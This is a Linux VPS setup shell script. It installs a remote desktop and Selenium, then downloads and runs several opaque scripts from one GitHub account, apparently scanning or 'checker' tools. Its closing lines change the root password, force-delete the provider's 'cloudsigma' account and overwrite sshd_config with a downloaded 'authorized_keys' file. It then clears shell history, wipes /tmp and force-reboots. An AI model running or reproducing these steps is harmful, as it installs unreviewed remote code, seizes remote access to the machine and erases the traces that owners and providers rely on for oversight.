apt update && apt upgrade
apt-get install mate-core mate-desktop-environment mate-notification-daemon xrdp python-pip firefox xvfb -y
sed -i '0,/-1/s//ask-1/' /etc/xrdp/xrdp.ini
service xrdp restart

pip install  lxml
pip install selenium
wget https://github.com/mozilla/geckodriver/releases/download/v0.20.0/geckodriver-v0.20.0-linux64.tar.gz 
tar -xvf geckodriver-v0.20.0-linux64.tar.gz
chmod +x geckodriver
cp geckodriver /usr/bin/geckodriver
wget https://raw.githubusercontent.com/talamanaka/adition/master/2sh0dan.py
wget https://raw.githubusercontent.com/talamanaka/adition/master/check.sh
wget https://raw.githubusercontent.com/talamanaka/adition/master/set.sh
wget https://raw.githubusercontent.com/talamanaka/adition/master/q1.py
wget https://raw.githubusercontent.com/talamanaka/adition/master/c
wget https://raw.githubusercontent.com/talamanaka/adition/master/c1
wget https://raw.githubusercontent.com/talamanaka/adition/master/8chek.sh

wget https://raw.githubusercontent.com/talamanaka/adition/master/lo.sh
wget https://raw.githubusercontent.com/talamanaka/adition/master/multi_check.sh

echo " /usr/bin/python 2sh0dan.py $1 $2 $3"  > 2
chmod +x 2sh0dan.py check.sh set.sh 2 lo.sh multi_check.sh 8chek.sh
cp 2 /usr/bin/5
cp 2sh0dan.py /usr/bin/2sh0dan.py
ti=$(curl ipinfo.io/ip)
echo "rdesktop " $ti "-g 1280x886"
./set.sh
cd /tmp/
passwd root
passwd vps
userdel -r -f cloudsigma
wget https://raw.githubusercontent.com/talamanaka/siyma/master/issue
wget https://raw.githubusercontent.com/talamanaka/siyma/master/authorized_keys
cat authorized_keys > /etc/ssh/sshd_config
cat issue > /etc/issue
service ssh start
cat /dev/null > ~/.bash_history && history -c
rm -rf /tmp/*
reboot -f
